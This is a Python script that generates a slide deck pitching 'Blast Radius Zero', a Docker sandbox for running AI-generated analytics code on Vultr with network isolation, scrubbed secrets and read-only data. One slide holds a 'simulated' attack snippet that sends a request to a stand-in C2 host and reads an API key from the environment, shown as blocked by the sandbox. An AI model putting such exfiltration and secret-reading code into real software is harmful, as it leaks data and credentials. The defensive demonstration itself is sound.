import os
import pptx
from pptx import Presentation
from pptx.util import Inches, Pt
from pptx.enum.text import PP_ALIGN
from pptx.dml.color import RGBColor
from pptx.enum.shapes import MSO_SHAPE

prs = Presentation()
prs.slide_width = Inches(13.333)
prs.slide_height = Inches(7.5)

# Color Palette
BG_COLOR = RGBColor(9, 13, 22)
PANEL_COLOR = RGBColor(17, 23, 38)
BORDER_COLOR = RGBColor(31, 41, 61)
VULTR_BLUE = RGBColor(0, 123, 252)
CYAN_ACCENT = RGBColor(0, 210, 255)
EMERALD_GREEN = RGBColor(16, 185, 129)
AMBER_WARN = RGBColor(245, 158, 11)
RED_ALERT = RGBColor(239, 68, 68)
TEXT_WHITE = RGBColor(241, 245, 249)
TEXT_MUTED = RGBColor(148, 163, 184)

def set_slide_background(slide):
    background = slide.background
    fill = background.fill
    fill.solid()
    fill.fore_color.rgb = BG_COLOR

def add_header(slide, title, category="Enterprise Cloud Compute"):
    set_slide_background(slide)
    
    # Top bar accent
    shape = slide.shapes.add_shape(MSO_SHAPE.RECTANGLE, Inches(0), Inches(0), Inches(13.333), Inches(0.9))
    shape.fill.solid()
    shape.fill.fore_color.rgb = RGBColor(13, 19, 31)
    shape.line.color.rgb = BORDER_COLOR
    
    # Header Title
    tx_box = slide.shapes.add_textbox(Inches(0.8), Inches(0.15), Inches(8), Inches(0.6))
    tf = tx_box.text_frame
    p = tf.paragraphs[0]
    p.text = "BLAST RADIUS ZERO"
    p.font.bold = True
    p.font.size = Pt(20)
    p.font.color.rgb = TEXT_WHITE
    p.font.name = "Segoe UI"
    
    # Category tag
    p2 = tf.add_paragraph()
    p2.text = "Powered by Vultr Cloud Compute & Vultr Serverless Inference"
    p2.font.size = Pt(11)
    p2.font.color.rgb = CYAN_ACCENT
    p2.font.name = "Segoe UI"

    # Slide Title
    stx = slide.shapes.add_textbox(Inches(0.8), Inches(1.1), Inches(11.7), Inches(0.8))
    stf = stx.text_frame
    sp = stf.paragraphs[0]
    sp.text = title
    sp.font.bold = True
    sp.font.size = Pt(28)
    sp.font.color.rgb = TEXT_WHITE
    sp.font.name = "Segoe UI"

blank_slide_layout = prs.slide_layouts[6]

# ==============================================================================
# Slide 1: Title Slide
# ==============================================================================
s1 = prs.slides.add_slide(blank_slide_layout)
set_slide_background(s1)

# Hero Card
card = s1.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(1.2), Inches(1.0), Inches(10.9), Inches(5.5))
card.fill.solid()
card.fill.fore_color.rgb = PANEL_COLOR
card.line.color.rgb = VULTR_BLUE
card.line.width = Pt(2)

tf = card.text_frame
tf.word_wrap = True
p = tf.paragraphs[0]
p.text = "BLAST RADIUS ZERO"
p.font.bold = True
p.font.size = Pt(44)
p.font.color.rgb = TEXT_WHITE
p.alignment = PP_ALIGN.CENTER

p2 = tf.add_paragraph()
p2.text = "Autonomous Sandboxed AI Data Analytics on Vultr Cloud Compute"
p2.font.bold = True
p2.font.size = Pt(24)
p2.font.color.rgb = CYAN_ACCENT
p2.alignment = PP_ALIGN.CENTER

p3 = tf.add_paragraph()
p3.text = "\nSafe, Zero-Trust Execution of AI-Generated Python Code"
p3.font.size = Pt(18)
p3.font.color.rgb = TEXT_MUTED
p3.alignment = PP_ALIGN.CENTER

p4 = tf.add_paragraph()
p4.text = '\n"An agent that only chats is a demo. An agent that executes safely is an enterprise product."'
p4.font.italic = True
p4.font.size = Pt(16)
p4.font.color.rgb = EMERALD_GREEN
p4.alignment = PP_ALIGN.CENTER

# ==============================================================================
# Slide 2: The Problem
# ==============================================================================
s2 = prs.slides.add_slide(blank_slide_layout)
add_header(s2, "The Critical Security Dilemma: Untrusted AI Code")

threats = [
    ("1. Data Exfiltration via Sockets", "Malicious or hallucinated code opens network sockets to transmit sensitive datasets to external C2 servers.", RED_ALERT),
    ("2. Cloud Credential Theft", "Scripts inspect os.environ for VULTR_API_KEY, database credentials, and cloud tokens, exposing production infrastructure.", AMBER_WARN),
    ("3. Dataset Corruption & Ransomware", "Unprotected write access enables untrusted code to delete, corrupt, or ransomware-encrypt production databases.", RED_ALERT),
    ("4. Compute Starvation & CPU Locking", "Runaway infinite loops (while True: pass) or fork bombs consume 100% of host compute, causing full denial of service.", AMBER_WARN)
]

for i, (ttitle, tdesc, tcol) in enumerate(threats):
    x = Inches(0.8 + (i % 2) * 5.9)
    y = Inches(2.1 + (i // 2) * 2.5)
    c = s2.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, x, y, Inches(5.6), Inches(2.2))
    c.fill.solid()
    c.fill.fore_color.rgb = PANEL_COLOR
    c.line.color.rgb = tcol
    c.line.width = Pt(1.5)
    
    ctf = c.text_frame
    ctf.word_wrap = True
    cp = ctf.paragraphs[0]
    cp.text = ttitle
    cp.font.bold = True
    cp.font.size = Pt(18)
    cp.font.color.rgb = tcol
    
    cp2 = ctf.add_paragraph()
    cp2.text = f"\n{tdesc}"
    cp2.font.size = Pt(14)
    cp2.font.color.rgb = TEXT_MUTED

# ==============================================================================
# Slide 3: Vultr System Architecture
# ==============================================================================
s3 = prs.slides.add_slide(blank_slide_layout)
add_header(s3, "Zero-Trust Architecture on Vultr Cloud Compute")

arch_nodes = [
    ("Client Web UI", "FastAPI + Modern Web UI\nUpload CSV & Natural Language Query\nTerminal Receipts & Visual Charts", VULTR_BLUE, Inches(0.8)),
    ("FastAPI Orchestrator", "Runs on Vultr Cloud Compute VM\nPrompts Vultr Serverless Inference\nDispatches Ephemeral Sandboxes\nAutonomous Self-Healing Loop", CYAN_ACCENT, Inches(4.8)),
    ("Vultr Inference API", "api.vultrinference.com/v1\nOpenAI-Compatible Endpoint\nModels: zephyr-7b, llama2\nSynthesizes Data Analysis Code", EMERALD_GREEN, Inches(8.8))
]

for title, desc, col, x in arch_nodes:
    b = s3.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, x, Inches(2.1), Inches(3.7), Inches(2.3))
    b.fill.solid()
    b.fill.fore_color.rgb = PANEL_COLOR
    b.line.color.rgb = col
    b.line.width = Pt(2)
    btf = b.text_frame
    btf.word_wrap = True
    bp = btf.paragraphs[0]
    bp.text = title
    bp.font.bold = True
    bp.font.size = Pt(18)
    bp.font.color.rgb = col
    bp2 = btf.add_paragraph()
    bp2.text = f"\n{desc}"
    bp2.font.size = Pt(12)
    bp2.font.color.rgb = TEXT_WHITE

# Sandbox container box at bottom
sbox = s3.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(4.7), Inches(11.7), Inches(2.2))
sbox.fill.solid()
sbox.fill.fore_color.rgb = RGBColor(12, 18, 30)
sbox.line.color.rgb = EMERALD_GREEN
sbox.line.width = Pt(2)

stf = sbox.text_frame
stf.word_wrap = True
stp = stf.paragraphs[0]
stp.text = "THROWAWAY DOCKER SANDBOX CONTAINER (Strict Kernel Containment)"
stp.font.bold = True
stp.font.size = Pt(17)
stp.font.color.rgb = EMERALD_GREEN

stp2 = stf.add_paragraph()
stp2.text = (
    "• Network Isolation: --network none (Zero bytes egress allowed / DNS disabled)\n"
    "• Zero Secrets Policy: Environment completely scrubbed of all host API keys and tokens\n"
    "• Read-Only Mounts: /data:ro prevents ransomware or file overwrite attacks\n"
    "• Hardware Caps: 256MB RAM cap | 1.0 CPU cap | 15s execution timeout watchdog"
)
stp2.font.size = Pt(13)
stp2.font.color.rgb = TEXT_MUTED

# ==============================================================================
# Slide 4: The 4 Containment Pillars
# ==============================================================================
s4 = prs.slides.add_slide(blank_slide_layout)
add_header(s4, "The 4 Containment Pillars of Blast Radius Zero")

pillars = [
    ("1. NETWORK ISOLATION", "--network none", "Complete socket and DNS isolation. Untrusted code cannot dial out to the internet or reach internal network interfaces.", EMERALD_GREEN),
    ("2. SECRET HYGIENE", "Zero Keys Injected", "The sandbox environment contains zero API keys, tokens, or credentials. Key inspection yields None.", VULTR_BLUE),
    ("3. READ-ONLY DATA", "/data:ro Mount", "Production datasets are mounted strictly as read-only volumes. Code cannot modify or truncate files.", CYAN_ACCENT),
    ("4. RESOURCE WATCHDOG", "256MB / 1.0 CPU", "Enforced hardware resource bounds prevent compute starvation. Runaway infinite loops are terminated after 15s.", AMBER_WARN)
]

for i, (title, flag, desc, col) in enumerate(pillars):
    x = Inches(0.8 + i * 2.95)
    pbox = s4.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, x, Inches(2.1), Inches(2.8), Inches(4.7))
    pbox.fill.solid()
    pbox.fill.fore_color.rgb = PANEL_COLOR
    pbox.line.color.rgb = col
    pbox.line.width = Pt(2)
    
    ptf = pbox.text_frame
    ptf.word_wrap = True
    pp = ptf.paragraphs[0]
    pp.text = title
    pp.font.bold = True
    pp.font.size = Pt(15)
    pp.font.color.rgb = col
    
    pp2 = ptf.add_paragraph()
    pp2.text = f"\n{flag}\n"
    pp2.font.bold = True
    pp2.font.size = Pt(13)
    pp2.font.color.rgb = TEXT_WHITE
    
    pp3 = ptf.add_paragraph()
    pp3.text = desc
    pp3.font.size = Pt(12)
    pp3.font.color.rgb = TEXT_MUTED

# ==============================================================================
# Slide 5: The Containment Moment (Attack Neutralization)
# ==============================================================================
s5 = prs.slides.add_slide(blank_slide_layout)
add_header(s5, "Containment Proof: Live Attack Neutralization")

# Left: Injected Attack
cleft = s5.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(2.1), Inches(5.6), Inches(4.8))
cleft.fill.solid()
cleft.fill.fore_color.rgb = RGBColor(10, 14, 22)
cleft.line.color.rgb = RED_ALERT
cleft.line.width = Pt(2)

ltf = cleft.text_frame
ltf.word_wrap = True
lp = ltf.paragraphs[0]
lp.text = "INJECTED ATTACK SCRIPT (Simulated Threat)"
lp.font.bold = True
lp.font.size = Pt(16)
lp.font.color.rgb = RED_ALERT

lp2 = ltf.add_paragraph()
lp2.text = (
    "\nimport urllib.request\nimport os\n\n"
    "# Vector 1: Network Exfiltration\n"
    "print('[ATTACK] Exfiltrating data to C2...')\n"
    "req = urllib.request.Request('http://c2.net/steal')\n"
    "urllib.request.urlopen(req, timeout=3)\n\n"
    "# Vector 2: Secret Extraction\n"
    "stolen_key = os.environ.get('VULTR_API_KEY')\n"
    "print(f'Stolen key: {stolen_key}')"
)
lp2.font.size = Pt(12)
lp2.font.color.rgb = RGBColor(240, 160, 160)

# Right: Neutralization Verdict
cright = s5.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(6.9), Inches(2.1), Inches(5.6), Inches(4.8))
cright.fill.solid()
cright.fill.fore_color.rgb = RGBColor(10, 14, 22)
cright.line.color.rgb = EMERALD_GREEN
cright.line.width = Pt(2)

rtf = cright.text_frame
rtf.word_wrap = True
rp = rtf.paragraphs[0]
rp.text = "SANDBOX ENFORCEMENT & VERDICT (Receipts)"
rp.font.bold = True
rp.font.size = Pt(16)
rp.font.color.rgb = EMERALD_GREEN

rp2 = rtf.add_paragraph()
rp2.text = (
    "\n[*] Ephemeral container spawned: blast_zero_9f82b\n"
    "[*] Isolation Flags: --network none | Mounts: /data:ro\n\n"
    "[ATTACK] Exfiltrating data to C2...\n"
    "[CONTAINED] Socket failed: Network is unreachable\n"
    "--> RESULT: Zero bytes egress allowed\n\n"
    "[ATTACK] Scanning environment for secrets...\n"
    "VULTR_API_KEY: None\n"
    "--> RESULT: Zero secrets exposed\n\n"
    "[VERDICT]: ATTACK CONTAINED & NEUTRALIZED\n"
    "BLAST RADIUS: STRICTLY ZERO"
)
rp2.font.size = Pt(12)
rp2.font.color.rgb = EMERALD_GREEN

# ==============================================================================
# Slide 6: Real Work with Receipts
# ==============================================================================
s6 = prs.slides.add_slide(blank_slide_layout)
add_header(s6, "Real Work with Receipts: Deterministic Analytics")

# Image box
chart_file = os.path.join(os.path.dirname(__file__), "video", "analysis_chart.png")
if os.path.exists(chart_file):
    s6.shapes.add_picture(chart_file, Inches(0.8), Inches(2.1), width=Inches(6.0), height=Inches(4.6))

# Right Info Box
rbox = s6.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(7.1), Inches(2.1), Inches(5.4), Inches(4.6))
rbox.fill.solid()
rbox.fill.fore_color.rgb = PANEL_COLOR
rbox.line.color.rgb = VULTR_BLUE
rbox.line.width = Pt(2)

rtf = rbox.text_frame
rtf.word_wrap = True
rp = rtf.paragraphs[0]
rp.text = "COMPUTED RECEIPTS & SELF-HEALING"
rp.font.bold = True
rp.font.size = Pt(18)
rp.font.color.rgb = CYAN_ACCENT

rp2 = rtf.add_paragraph()
rp2.text = (
    "\n• Factual Computed Numbers:\n"
    "  - Regional Vultr Cloud performance & bandwidth\n"
    "  - Hard numbers in stdout, zero conversational guessing\n\n"
    "• High-Resolution Visual Artifacts:\n"
    "  - Matplotlib & Seaborn plots rendered in sandbox\n"
    "  - Harvested cleanly into isolated output directory\n\n"
    "• Autonomous Self-Healing Runner:\n"
    "  - Tracebacks automatically fed back to Vultr Inference\n"
    "  - Automated patch & re-execution until verified\n"
    "  - Ephemeral containers destroyed cleanly post-run"
)
rp2.font.size = Pt(13)
rp2.font.color.rgb = TEXT_WHITE

# ==============================================================================
# Slide 7: Production Deployment on Vultr
# ==============================================================================
s7 = prs.slides.add_slide(blank_slide_layout)
add_header(s7, "Production Deployment on Vultr Cloud Compute")

fcard = s7.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(1.5), Inches(2.1), Inches(10.3), Inches(4.6))
fcard.fill.solid()
fcard.fill.fore_color.rgb = PANEL_COLOR
fcard.line.color.rgb = CYAN_ACCENT
fcard.line.width = Pt(2)

ftf = fcard.text_frame
ftf.word_wrap = True
fp = ftf.paragraphs[0]
fp.text = "1-Click Launch on Vultr Cloud Compute VM"
fp.font.bold = True
fp.font.size = Pt(24)
fp.font.color.rgb = TEXT_WHITE
fp.alignment = PP_ALIGN.CENTER

fp2 = ftf.add_paragraph()
fp2.text = (
    "\n$ git clone https://github.com/your-org/blast-radius-zero.git\n"
    "$ chmod +x deploy.sh && ./deploy.sh\n\n"
    "[OK] Docker engine & sandbox image built\n"
    "[OK] Web dashboard active on Port 80 / 8000\n"
    "[OK] Zero-trust AI analytics ready for production"
)
fp2.font.size = Pt(15)
fp2.font.color.rgb = EMERALD_GREEN
fp2.alignment = PP_ALIGN.CENTER

fp3 = ftf.add_paragraph()
fp3.text = "\nBlast Radius Zero: Turning Autonomous AI Agents into Hardened Enterprise Products."
fp3.font.italic = True
fp3.font.size = Pt(16)
fp3.font.color.rgb = CYAN_ACCENT
fp3.alignment = PP_ALIGN.CENTER

# Save presentation
out_path = os.path.join(os.path.dirname(__file__), "blast_radius_zero_presentation.pptx")
prs.save(out_path)
print(f"Presentation saved successfully at: {out_path}")
